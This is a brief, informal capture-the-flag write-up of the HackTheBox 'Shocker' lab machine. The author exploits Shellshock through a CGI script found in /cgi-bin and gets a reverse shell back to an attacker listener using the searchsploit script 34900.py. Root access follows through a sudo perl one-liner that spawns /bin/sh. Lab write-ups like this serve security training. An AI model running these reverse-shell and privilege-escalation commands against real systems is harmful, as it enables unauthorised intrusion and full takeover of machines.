### Write up for Shocker Machine on HTB
Enumerating shocker, the biggest giveaway was the machine name and an obvious emoji of a shocked bug 
as i had exploited severall shellshock vulnerability, immediately realized i was dealling with a shellshock variant which is the apache mod_cgi


which requires a cgi script to be present in the webserver directory for it to be exploitable, did several directory and file listing search using several tools FFUF, Dirb, Gobuster, Dirbuster Dirsearch, looking for a .cgi script so i could write a malicious environmental variable which would be ran by bash , all to know avail 


After a futher research a nudge from the forums  , i realised .cgi is not only the exploitable file for shellshock, did few more searches with tweaked extensions of .bash,.sh,.cgi

found user.sh in the cgi-bin directory , checked searchsploit to find a python script writen to exploit shellshock which gave me a shelly user access on the machine 

python2 34900.py payload=reverse rhost=10.10.10.56 lhost=10.10.14.7 lport=32327 pages=/cgi-bin/user.sh





checkiing sudo -l , I'm able to run the perl language as root , immediately checking GTFO bin's , we have a sudo privesc 


    sudo perl -e 'exec "/bin/sh";'

so running " sudo -u root perl -e 'exec "/bin/sh";' "   We got root in less than 1 minutes 


![image](https://user-images.githubusercontent.com/12541755/113401483-07676d80-9369-11eb-99ac-80aaded21a20.png)

Shocker Pwned 
### Yipee 

Time to User : 9 Hours
Time to Root : 1 Minutes 
